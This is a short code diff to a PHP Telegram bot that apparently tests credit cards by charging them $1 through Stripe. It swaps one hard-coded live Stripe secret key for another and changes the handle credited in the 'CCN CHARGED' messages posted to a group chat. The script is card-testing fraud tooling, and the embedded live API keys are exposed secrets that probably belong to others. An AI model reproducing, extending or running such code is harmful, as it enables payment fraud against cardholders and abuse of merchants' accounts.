@@ -22,7 +22,7 @@ edit_message($chatId," Started....",$message_id_1);
 while($c>=0)
 {
 $pr++;
-$sk ="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";
+$sk ="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";
 
 //------[Randomize Description]------//
 $word = array(
@@ -182,7 +182,7 @@ $risklevel = trim(strip_tags(getStr($r2, '"risk_level": "', '"')));
 if ((strpos($r2, '"status": "succeeded"')) || (strpos($r2, '"seller_message": "Payment complete."'))){
   sendMessage('-1001837568442',urlencode("
 CHARGED : <code> $lista </code>
-𝘾𝘾𝙉 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 $1 @nexon_xD ✅
+𝘾𝘾𝙉 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 $1 @junednyeker ✅
  "),$messageId);
   $c--;
   continue;
